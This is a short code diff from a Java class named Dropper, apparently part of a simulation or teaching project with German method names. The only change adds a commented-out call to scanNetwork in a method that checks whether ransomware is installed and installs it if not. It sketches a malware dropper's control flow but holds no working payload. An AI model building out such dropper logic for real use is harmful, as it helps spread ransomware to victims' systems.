@@ -35,6 +35,7 @@ public class Dropper extends Anwendung {
     private void checkIfRansomwareIsInstalled() {
         if (isRansomwareInstalled()){
             ausfuehren("scanNetwork", null);
+//            scanNetwork();
         }
         else{
             installRansomware();
